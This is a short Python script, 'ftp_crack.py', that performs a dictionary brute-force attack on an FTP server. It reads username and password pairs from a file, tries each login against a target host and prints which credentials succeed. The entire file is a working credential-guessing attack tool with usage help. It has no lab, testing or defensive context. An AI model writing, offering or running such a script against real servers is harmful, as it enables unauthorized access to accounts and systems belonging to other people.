#!/usr/bin/env python3
import ftplib
import sys
import getopt

def attackFTP(hostname, dictionary):
  for username, password in dictionary:    
    try:
      ftp = ftplib.FTP(hostname)
      ftp.login(username, password)
      print('[*] %s@%s (%s)\t'%(username, hostname, password) +'FTP Logon Succeeded.')
      ftp.quit()
      break
    except:
      print('[*] %s@%s\t'%(username, hostname) +'FTP Logon Failed.')
      
def usage():
  print("\n ftp_crack.py by Tim auf der Landwehr")
  print()
  print(' Usage: ftp_crack.py')
  print('   > Brute Force attack on ftp server using dictionary of user credentials')
  print('')
  print(' --host [hostname]')
  print(' \tSet the hostname, default: localhost')
  print(' --dict [filename]')
  print(' \tSet the dictionary file, default: dictionary.txt')
  print(' -h --help')
  print(' \tShow this information')

def main():
  try:
    opts, args = getopt.gnu_getopt(sys.argv[1:],"ho:v",["help", "host=", "dict="])
  except (getopt.GetoptError, NameError):
    usage()
    sys.exit()

  # defaults
  hostname = 'localhost'
  dict_file = 'dictionary.txt'

  for o,v in opts:
    if o in ['--host']:
      hostname = v
    elif o in ['--dict']:
      dict_file = v
    elif o in ['-h','--help']:
      usage()
      sys.exit(1)
    else:
      print('unknown parameter %s'%o)
      sys.exit(1)

  dictionary = []
  
  with open(dict_file, 'r') as file_content:
    for line in file_content.readlines():
      user, password = line.strip().split()
      dictionary.append( (user, password) )
  
  attackFTP(hostname, dictionary)

      
if __name__ == "__main__":
  main()
